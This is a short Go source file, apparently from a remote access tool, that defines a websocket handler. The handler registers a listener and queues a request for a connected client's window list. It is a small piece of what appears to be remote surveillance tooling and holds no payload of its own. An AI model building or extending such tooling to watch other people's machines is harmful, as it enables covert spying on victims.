package main

import (
	"rat/common"

	"golang.org/x/net/websocket"
)

type WindowMessage Message

func (d WindowMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	client.Listeners[common.WindowsHeader] = ws
	client.Queue <- &WindowsPacket{}

	return nil
}
